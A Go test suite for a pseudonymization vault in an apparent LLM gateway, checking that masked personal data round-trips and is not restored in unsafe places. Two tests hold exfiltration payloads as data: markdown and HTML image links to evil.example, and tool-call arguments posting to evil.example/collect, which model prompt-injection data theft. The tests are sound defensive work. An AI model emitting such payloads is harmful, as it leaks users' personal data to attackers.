package pseudonym

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"strings"
	"testing"

	"github.com/azuresong-afk/ai_railway/internal/detect"
	"github.com/azuresong-afk/ai_railway/internal/detect/pii"
	"github.com/azuresong-afk/ai_railway/internal/policy"
)

// span — фрагмент с первым вхождением sub в text.
func span(t *testing.T, text, sub, cat string, a policy.Action) Span {
	t.Helper()
	i := strings.Index(text, sub)
	if i < 0 {
		t.Fatalf("%q не найдено", sub)
	}
	return Span{Start: i, End: i + len(sub), Category: cat, Action: a}
}

// protect — Protect с проверкой ошибки.
func protect(t *testing.T, v *Vault, text string, spans ...Span) string {
	t.Helper()
	out, err := v.Protect(text, spans)
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// detectSpans — находки pii.ru как фрагменты с действием a.
func detectSpans(t *testing.T, text string, a policy.Action) []Span {
	t.Helper()
	fs, err := pii.New().Detect(context.Background(), detect.Text{Text: text, Direction: detect.Input, Source: detect.SourceUser})
	if err != nil {
		t.Fatal(err)
	}
	var out []Span
	for _, f := range fs {
		out = append(out, Span{Start: f.Start, End: f.End, Category: f.Category, Action: a})
	}
	return out
}

func TestTypeOf(t *testing.T) {
	cases := map[string]string{
		pii.CatPhone:                     "PHONE",
		pii.CatSNILS:                     "SNILS",
		pii.CatOGRNIP:                    "OGRNIP",
		"secret.private_key":             "PRIVATEKEY",
		"secret.connection_string":       "CONNECTIONSTRING",
		"lists.x9":                       "X9",
		"a.9x":                           "X",
		"a.___":                          "DATA",
		"":                               "DATA",
		"a.very_long_category_name_here": "VERYLONGCATEGORY",
	}
	for cat, want := range cases {
		if got := TypeOf(cat); got != want {
			t.Errorf("TypeOf(%q) = %q, ожидалось %q", cat, got, want)
		}
		if got := TypeOf(cat); len(got) > MaxTypeLen {
			t.Errorf("TypeOf(%q) длиннее %d", cat, MaxTypeLen)
		}
	}
}

// TestDM31_PseudonymizeRoundTrip — ПДн из запроса не доходят до модели и
// восстанавливаются в ответе.
func TestDM31_PseudonymizeRoundTrip(t *testing.T) {
	phone, snils, email := pii.SynthPhone(1), pii.SynthSNILS(2), pii.SynthEmail(3)
	text := "Клиент: телефон " + phone + ", СНИЛС " + snils + ", почта " + email + ". Повторно: " + phone + "."
	spans := detectSpans(t, text, policy.Pseudonymize)
	if len(spans) != 4 {
		t.Fatalf("находок %d, ожидалось 4", len(spans))
	}
	v := NewVault(Limits{}, text)
	out := protect(t, v, text, spans...)
	for _, val := range []string{phone, snils, email} {
		if strings.Contains(out, val) {
			t.Errorf("значение осталось в запросе к модели: %s", out)
		}
	}
	want := "Клиент: телефон [[PHONE_1]], СНИЛС [[SNILS_1]], почта [[EMAIL_1]]. Повторно: [[PHONE_1]]."
	if out != want {
		t.Fatalf("Protect:\n%s\nожидалось\n%s", out, want)
	}
	if got := v.Restore(out); got != text {
		t.Fatalf("Restore:\n%s\nожидалось\n%s", got, text)
	}
	st := v.Stats()
	if st.Issued != 3 || st.Pseudonymized != 4 || st.Restored != 4 || st.Failed() != 0 {
		t.Fatalf("счётчики: %+v", st)
	}
}

func TestProtectNumbering(t *testing.T) {
	v := NewVault(Limits{})
	a, b := pii.SynthPhone(10), pii.SynthPhone(11)
	t1 := a + " " + b
	out1 := protect(t, v, t1, span(t, t1, a, pii.CatPhone, policy.Pseudonymize), span(t, t1, b, pii.CatPhone, policy.Pseudonymize))
	// Второй фрагмент того же запроса: прежнее значение — прежний псевдоним.
	t2 := "снова " + b
	out2 := protect(t, v, t2, span(t, t2, b, pii.CatPhone, policy.Pseudonymize))
	if out1 != "[[PHONE_1]] [[PHONE_2]]" || out2 != "снова [[PHONE_2]]" {
		t.Fatalf("нумерация: %q, %q", out1, out2)
	}
	// Одинаковый текст в разных категориях — разные псевдонимы.
	t3 := "12345"
	out3 := protect(t, v, t3, Span{0, 5, "lists.code", policy.Pseudonymize})
	if out3 != "[[CODE_1]]" {
		t.Fatalf("тип: %q", out3)
	}
}

func TestProtectOverlap(t *testing.T) {
	text := "abcdefghij"
	cases := []struct {
		name  string
		spans []Span
		want  string
	}{
		{"redact сильнее пересекающегося pseudonymize",
			[]Span{{2, 6, "pii.phone", policy.Pseudonymize}, {4, 8, "secret.token", policy.Redact}}, "ab[[PHONE]]ij"},
		{"вложенный фрагмент поглощается",
			[]Span{{3, 4, "pii.inn", policy.Pseudonymize}, {1, 9, "pii.account", policy.Pseudonymize}}, "a[[ACCOUNT_1]]j"},
		{"соседние фрагменты не объединяются",
			[]Span{{5, 7, "pii.inn", policy.Pseudonymize}, {2, 5, "pii.inn", policy.Pseudonymize}}, "ab[[INN_1]][[INN_2]]hij"},
		{"цепочка пересечений",
			[]Span{{0, 3, "pii.card", policy.Pseudonymize}, {2, 5, "pii.inn", policy.Pseudonymize}, {4, 10, "pii.snils", policy.Pseudonymize}}, "[[CARD_1]]"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := NewVault(Limits{})
			out := protect(t, v, text, c.spans...)
			if out != c.want {
				t.Fatalf("%q, ожидалось %q", out, c.want)
			}
			if strings.Contains(c.want, "_1]]") && v.Restore(out) != text {
				t.Fatalf("объединение не восстанавливается: %q", v.Restore(out))
			}
		})
	}
}

func TestProtectRejects(t *testing.T) {
	text := "тел. 1"
	cases := []Span{
		{0, 2, "pii.phone", policy.Block},
		{0, 2, "pii.phone", policy.Log},
		{0, 2, "pii.phone", ""},
		{-1, 2, "pii.phone", policy.Redact},
		{2, 2, "pii.phone", policy.Redact},
		{3, 2, "pii.phone", policy.Redact},
		{0, len(text) + 1, "pii.phone", policy.Redact},
		{1, 4, "pii.phone", policy.Redact}, // разрезает «т»
	}
	for _, s := range cases {
		v := NewVault(Limits{})
		if out, err := v.Protect(text, []Span{{0, 2, "pii.phone", policy.Redact}, s}); err == nil || out != "" {
			t.Errorf("%+v: ожидалась ошибка без текста, получено %q, %v", s, out, err)
		}
	}
}

// TestReserveExisting — псевдоним, который уже есть в запросе, не выдаётся:
// иначе в ответе не различить, что имел в виду пользователь. Его повтор
// моделью — не неудачная подстановка.
func TestReserveExisting(t *testing.T) {
	phone := pii.SynthPhone(5)
	text := `Шаблон [[PHONE_1]] и \[\[phone\_2\]\], а номер — ` + phone
	v := NewVault(Limits{}, text, "ещё [PHONE 3]")
	out := protect(t, v, text, span(t, text, phone, pii.CatPhone, policy.Pseudonymize))
	if !strings.HasSuffix(out, "[[PHONE_4]]") {
		t.Fatalf("выдан занятый номер: %q", out)
	}
	if got := v.Restore("[[PHONE_1]] [[PHONE_4]]"); got != "[[PHONE_1]] "+phone {
		t.Fatalf("Restore: %q", got)
	}
	if st := v.Stats(); st.Failed() != 0 {
		t.Fatalf("повтор псевдонима из запроса посчитан неудачей: %+v", st)
	}
}

func TestFallbackToRedact(t *testing.T) {
	v := NewVault(Limits{MaxEntries: 1})
	a, b := pii.SynthPhone(1), pii.SynthPhone(2)
	text := a + " " + b + " " + a
	out := protect(t, v, text, detectSpans(t, text, policy.Pseudonymize)...)
	if out != "[[PHONE_1]] [[PHONE]] [[PHONE_1]]" {
		t.Fatalf("сверх предела: %q", out)
	}
	if st := v.Stats(); st.Fallback != 1 || st.Redacted != 1 || st.Issued != 1 {
		t.Fatalf("счётчики: %+v", st)
	}
	// Номера кончились.
	v = NewVault(Limits{})
	v.next["PHONE"] = MaxNumber
	if out := protect(t, v, a, Span{0, len(a), pii.CatPhone, policy.Pseudonymize}); out != "[[PHONE]]" {
		t.Fatalf("номера кончились: %q", out)
	}
}

// restoreVault — словарь с телефоном [[PHONE_1]] и СНИЛС [[SNILS_1]].
func restoreVault(t *testing.T, lim Limits) (*Vault, string, string) {
	t.Helper()
	phone, snils := pii.SynthPhone(7), pii.SynthSNILS(8)
	v := NewVault(lim)
	text := phone + " СНИЛС " + snils
	if out := protect(t, v, text, detectSpans(t, text, policy.Pseudonymize)...); out != "[[PHONE_1]] СНИЛС [[SNILS_1]]" {
		t.Fatalf("Protect: %q", out)
	}
	return v, phone, snils
}

// TestRestoreTolerant — частые искажения псевдонима моделью (ADR-0005).
func TestRestoreTolerant(t *testing.T) {
	v, phone, _ := restoreVault(t, Limits{})
	for _, in := range []string{
		"[[PHONE_1]]",
		`\[\[PHONE\_1\]\]`,
		`[[PHONE\_1]]`,
		`\[PHONE_1\]`,
		"[[phone_1]]",
		"[[Phone_1]]",
		"[[ PHONE_1 ]]",
		"[[  PHONE_1  ]]",
		"[PHONE_1]",
		"[[PHONE_1]",
		"[PHONE_1]]",
		"[[PHONE-1]]",
		"[[PHONE 1]]",
	} {
		if got := v.Restore("Звоните: " + in + "."); got != "Звоните: "+phone+"." {
			t.Errorf("%s → %q", in, got)
		}
	}
	for _, in := range []string{"**[[PHONE_1]]**", "`[[PHONE_1]]`", "([[PHONE_1]])", "[[[PHONE_1]]]"} {
		want := strings.Replace(in, "[[PHONE_1]]", phone, 1)
		if got := v.Restore(in); got != want {
			t.Errorf("%s → %q, ожидалось %q", in, got, want)
		}
	}
	if st := v.Stats(); st.Failed() != 0 {
		t.Fatalf("неудачи: %+v", st)
	}
}

// TestRestoreUnchanged — что остаётся как есть и как считается в метрике
// неудачных подстановок.
func TestRestoreUnchanged(t *testing.T) {
	v, _, _ := restoreVault(t, Limits{})
	cases := []struct {
		in     string
		failed int
	}{
		{"[[PHONE_2]]", 1},      // номер искажён
		{"[[PHONE_01]]", 0},     // ведущий ноль — не псевдоним
		{"[[PHONE_123456]]", 0}, // слишком длинный номер
		{"[[ТЕЛЕФОН_1]]", 1},    // тип переведён
		{"[[INN_1]]", 0},        // тип не выдавался
		{"PHONE_1", 1},          // скобки потеряны
		{"Звоните PHONE_1.", 1},
		{"<PHONE_1>", 1},
		{"{{PHONE_1}}", 1},
		{"SNILS-1", 1},
		{"MYPHONE_1 PHONE_1X phone_1", 0},
		{"[[PHONE]]", 0}, // маркер маскирования
		{"[[PHONE_]]", 0},
		{"[[PHONE__1]]", 0},
		{"[[   PHONE_1]]", 1}, // больше двух пробелов: искажён сильнее допустимого
		{"[[PHONE_1", 1},      // оборван
		{"[^1] [1] [a-b] [[x]] [[Привет]] [[ПРИВЕТ_]]", 0},
		{`\\[[PHONE_9]]`, 1},
		{`\[[PHONE_1]]`, 0}, // смешанное экранирование: «\» остаётся, место небезопасно
	}
	for _, c := range cases {
		before := v.Stats()
		if got := v.Restore(c.in); got != c.in {
			t.Errorf("%s → %q", c.in, got)
		}
		after := v.Stats()
		if d := after.Failed() - before.Failed() - (after.Unsafe - before.Unsafe); d != c.failed {
			t.Errorf("%s: неудач +%d, ожидалось +%d", c.in, d, c.failed)
		}
	}
}

// TestRestoreKeepsBackslash — обратная косая перед псевдонимом не
// принимается за экранирование markdown: экранирование должно быть у всего
// псевдонима.
func TestRestoreKeepsBackslash(t *testing.T) {
	v := NewVault(Limits{})
	out := protect(t, v, `C:\12345`, Span{3, 8, "lists.code", policy.Pseudonymize})
	if out != `C:\[[CODE_1]]` {
		t.Fatalf("Protect: %q", out)
	}
	// Место небезопасно (похоже на путь), но обратная косая не теряется.
	if got := v.Restore(out); got != out {
		t.Fatalf("Restore: %q", got)
	}
	if got := v.Restore(`путь \[\[CODE\_1\]\]`); got != `путь 12345` {
		t.Fatalf("Restore: %q", got)
	}
}

// TestRestoreNoRecursion — значение, похожее на псевдоним, не раскрывается
// повторно.
func TestRestoreNoRecursion(t *testing.T) {
	v := NewVault(Limits{})
	text := "код [[A_1]] тут"
	out := protect(t, v, text, Span{Start: 7, End: len(text) - 4, Category: "lists.code", Action: policy.Pseudonymize})
	if got := v.Restore(out + " " + out); got != text+" "+text {
		t.Fatalf("%q → %q", out, got)
	}
}

// TestDM11_RestoreNotInURL — псевдоним там, где он может стать частью
// адреса, не восстанавливается: инъекция не выведет значение на чужой
// сервер через ссылку или картинку. Среди случаев — обходы из ревью
// cert-reviewer задач 1.20–1.21.
func TestDM11_RestoreNotInURL(t *testing.T) {
	v, phone, _ := restoreVault(t, Limits{})
	blocked := []string{
		"![](https://evil.example/p?d=[[PHONE_1]])",
		"[ссылка](https://evil.example/[[PHONE_1]])",
		"https://evil.example/?a=x&b=[[PHONE_1]]",
		"![](//evil.example/?q=[[PHONE_1]])",
		"![](<https://evil.example/? [[PHONE_1]]>)",
		"<img src=\"https://evil.example/?q=\n[[PHONE_1]]\">",
		"<img src='https://evil.example/?q= x [[PHONE_1]]'>",
		`[r]: https://evil.example/?q=[[PHONE_1]]`,
		`https:\/\/evil.example\/[[PHONE_1]]`,
		`![x](https:&#47;&#47;evil.example/p.png?d=[[PHONE_1]])`,
		`![x](http:evil.example/p.png?d=[[PHONE_1]])`,
		`![x](/\evil.example/p.png?d=[[PHONE_1]])`,
		`<img src="\\evil.example/?q=[[PHONE_1]]">`,
		`<img src="/\evil.example/?q=[[PHONE_1]]">`,
		`![x](<https://evil.example/p.png?d=\> [[PHONE_1]]>)`,
		"<img src=\"https://evil.example/?a=>\n[[PHONE_1]]\">",
		"www.evil.example/?q=[[PHONE_1]]",
		"www.evil.example[[PHONE_1]]",
		"mailto:[[PHONE_1]]",
		"![](evil.example?d=[[PHONE_1]])",
		`https://evil.example/?q=\[\[PHONE\_1\]\]`,
	}
	for _, in := range blocked {
		before := v.Stats().Unsafe
		if got := v.Restore(in); got != in {
			t.Errorf("восстановлено в адресе: %q", got)
		}
		if v.Stats().Unsafe != before+1 {
			t.Errorf("%s: не посчитано в Unsafe", in)
		}
	}
	allowed := []string{
		"Сайт https://bank.example, телефон [[PHONE_1]]",
		"https://bank.example\n[[PHONE_1]]",
		"<b>https://bank.example</b> [[PHONE_1]]",
		"a/b [[PHONE_1]]",
		"// комментарий [[PHONE_1]]",
		"Телефон: [[PHONE_1]]",
		"Телефон:[[PHONE_1]]",
		"(тел. [[PHONE_1]])",
		"Ваш номер ([[PHONE_1]])",
		"«**[[PHONE_1]]**»",
	}
	for _, in := range allowed {
		want := strings.Replace(in, "[[PHONE_1]]", phone, 1)
		if got := v.Restore(in); got != want {
			t.Errorf("%s → %q", in, got)
		}
	}
}

// TestRestoreJSON — content в формате JSON: значение экранируется и
// вставляется только в значение строки; после признака адреса в любой
// строке — нигде.
func TestRestoreJSON(t *testing.T) {
	v := NewVault(Limits{})
	value := `a"b\c` + "\n<x>"
	text := "секрет " + value
	if out := protect(t, v, text, Span{Start: len("секрет "), End: len(text), Category: "secret.password", Action: policy.Pseudonymize}); out != "секрет [[PASSWORD_1]]" {
		t.Fatalf("Protect: %q", out)
	}
	doc := `{"note":"пароль [[PASSWORD_1]]","raw":[[PASSWORD_1]],"[[PASSWORD_1]]":1,"esc":"q\"[[PASSWORD_1]]",` +
		`"when":"10:30","ok":["[[PASSWORD_1]]"],"url":"https://x.example/ [[PASSWORD_1]]","after":"[[PASSWORD_1]]"}`
	got := v.RestoreJSON(doc)
	var m map[string]any
	if err := json.Unmarshal([]byte(got), &m); err == nil {
		t.Fatalf("ожидался невалидный JSON из-за псевдонима вне строки: %s", got)
	}
	fixed := strings.Replace(got, `"raw":[[PASSWORD_1]],`, "", 1)
	if err := json.Unmarshal([]byte(fixed), &m); err != nil {
		t.Fatalf("JSON испорчен: %v: %s", err, fixed)
	}
	if m["note"] != "пароль "+value || m["esc"] != `q"`+value || m["ok"].([]any)[0] != value {
		t.Fatalf("значения: %#v", m)
	}
	if _, ok := m["[[PASSWORD_1]]"]; !ok {
		t.Fatalf("восстановлено в ключе: %#v", m)
	}
	if m["url"] != "https://x.example/ [[PASSWORD_1]]" || m["after"] != "[[PASSWORD_1]]" {
		t.Fatalf("восстановлено после адреса: %#v", m)
	}
	if st := v.Stats(); st.Unsafe != 4 || st.Restored != 3 {
		t.Fatalf("счётчики: %+v", st)
	}
	for _, in := range []string{
		`{"a":"\\[[PASSWORD_1]]"}`, // «\\» в строке — признак пути
		`{"a":"x\[[PASSWORD_1]]"}`, // сразу после «\»
		`{"u":"https:\u002f\u002fevil.example","a":"[[PASSWORD_1]]"}`,
		`{"u":"http:evil.example","a":"[[PASSWORD_1]]"}`,
		`{"u":"www.evil.example","a":"[[PASSWORD_1]]"}`,
	} {
		if got := v.RestoreJSON(in); got != in {
			t.Errorf("%s → %s", in, got)
		}
	}
}

// TestDM13_RestoreToolArgs — аргументы tool_calls: если в них есть адрес,
// не восстанавливается ничего, даже когда адрес идёт после псевдонима.
func TestDM13_RestoreToolArgs(t *testing.T) {
	v, phone, _ := restoreVault(t, Limits{})
	for _, in := range []string{
		`{"body":"[[PHONE_1]]","url":"https://evil.example/collect"}`,
		`{"url":"https://evil.example/collect","body":"[[PHONE_1]]"}`,
		`{"body":"[[PHONE_1]]","host":"evil.example","path":"\/c"}`,
	} {
		if got := v.RestoreToolArgs(in); got != in {
			t.Errorf("восстановлено при адресе в аргументах: %s", got)
		}
	}
	in := `{"phone":"[[PHONE_1]]","when":"10:30"}`
	if got := v.RestoreToolArgs(in); got != `{"phone":"`+phone+`","when":"10:30"}` {
		t.Fatalf("RestoreToolArgs: %s", got)
	}
	// RestoreJSON (поток) адрес после псевдонима не видит — поэтому для
	// tool_calls только RestoreToolArgs.
	if got := v.RestoreJSON(`{"body":"[[PHONE_1]]","url":"https://evil.example/"}`); !strings.Contains(got, phone) {
		t.Fatalf("RestoreJSON: %s", got)
	}
}

func TestRestoreLimit(t *testing.T) {
	v, phone, _ := restoreVault(t, Limits{MaxRestoreBytes: 2*len(pii.SynthPhone(7)) + 1})
	got := v.Restore("[[PHONE_1]] [[PHONE_1]] [[PHONE_1]]")
	if got != phone+" "+phone+" [[PHONE_1]]" {
		t.Fatalf("%q", got)
	}
	if st := v.Stats(); st.Limited != 1 || st.Failed() != 1 {
		t.Fatalf("счётчики: %+v", st)
	}
}

// TestVaultNoLeak — словарь не печатает значения ни в fmt, ни в slog.
func TestVaultNoLeak(t *testing.T) {
	v, phone, snils := restoreVault(t, Limits{})
	var buf bytes.Buffer
	slog.New(slog.NewJSONHandler(&buf, nil)).Info("x", "vault", v)
	out := fmt.Sprintf("%v %+v %#v %s", v, v, v, v) + buf.String() + fmt.Sprintf("%+v", v.Stats())
	if strings.Contains(out, phone) || strings.Contains(out, snils) {
		t.Fatalf("значение в выводе: %s", out)
	}
	v.Clear()
	if v.Len() != 0 || v.Restore("[[PHONE_1]]") != "[[PHONE_1]]" {
		t.Fatal("Clear не удалил значения")
	}
}

// FuzzProtectRestore — Protect и Restore на любом тексте и фрагментах: без
// паники; ошибка — ровно при неверных фрагментах; без символов, которые
// меняют разбор или делают место небезопасным ([ ] \ / < % & = ? @ : www.),
// Restore(Protect(text)) == text.
func FuzzProtectRestore(f *testing.F) {
	f.Add("телефон "+pii.SynthPhone(1)+" и почта "+pii.SynthEmail(1), []byte{8, 16, 1, 30, 40, 0})
	f.Add(`[[PHONE_1]] https://x/[[PHONE_1]] \[x`, []byte{0, 3, 1})
	f.Add("абв", []byte{1, 2, 1})
	f.Fuzz(func(t *testing.T, text string, raw []byte) {
		if len(text) > 4096 || len(raw) > 60 {
			return
		}
		var spans []Span
		for i := 0; i+2 < len(raw); i += 3 {
			s, e := int(raw[i])%(len(text)+1), int(raw[i+1])%(len(text)+1)
			a := policy.Pseudonymize
			if raw[i+2]%4 == 0 {
				a = policy.Redact
			}
			spans = append(spans, Span{Start: s, End: e, Category: "pii.phone", Action: a})
		}
		v := NewVault(Limits{MaxEntries: 8}, text)
		out, err := v.Protect(text, spans)
		valid := true
		for _, s := range spans {
			if s.Start < 0 || s.End <= s.Start || s.End > len(text) || !detect.OnRuneBoundary(text, s.Start) || !detect.OnRuneBoundary(text, s.End) {
				valid = false
			}
		}
		if valid != (err == nil) {
			t.Fatalf("ошибка %v при корректности фрагментов %v", err, valid)
		}
		if err != nil {
			return
		}
		got := v.Restore(out)
		_ = v.RestoreJSON(out)
		_ = v.RestoreToolArgs(out)
		redacted := v.Stats().Redacted > 0
		special := strings.ContainsAny(text, `[]\/<%&=?@:`) || strings.Contains(strings.ToLower(text), "www.")
		if !redacted && !special && got != text {
			t.Fatalf("Restore(Protect(%q)) = %q (через %q)", text, got, out)
		}
	})
}
